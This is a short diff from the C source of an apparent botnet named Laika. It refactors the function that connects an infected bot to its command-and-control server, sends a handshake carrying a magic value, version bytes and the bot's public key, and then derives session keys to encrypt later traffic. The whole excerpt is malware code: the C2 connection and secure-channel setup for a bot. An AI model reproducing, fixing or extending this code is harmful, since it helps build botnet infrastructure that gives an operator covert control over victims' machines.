@@ -67,15 +67,15 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
     laikaP_addSock(&bot->pList, sock);
 
     /* queue handshake request */
-    laikaS_startOutPacket(sock, LAIKAPKT_HANDSHAKE_REQ);
+    laikaS_startOutPacket(bot->peer, LAIKAPKT_HANDSHAKE_REQ);
     laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
     laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
     laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
-    laikaS_endOutPacket(sock); /* force packet body to be plaintext */
-    laikaS_setSecure(sock, true); /* after the cnc receives our handshake, our packets will be encrypted */
+    laikaS_endOutPacket(bot->peer); /* force packet body to be plaintext */
+    laikaS_setSecure(bot->peer, true); /* after the cnc receives our handshake, our packets will be encrypted */
 
-    if (crypto_kx_client_session_keys(bot->peer->sock.inKey, bot->peer->sock.outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
+    if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
         LAIKA_ERROR("failed to gen session key!\n")
 
     if (!laikaS_handlePeerOut(bot->peer))
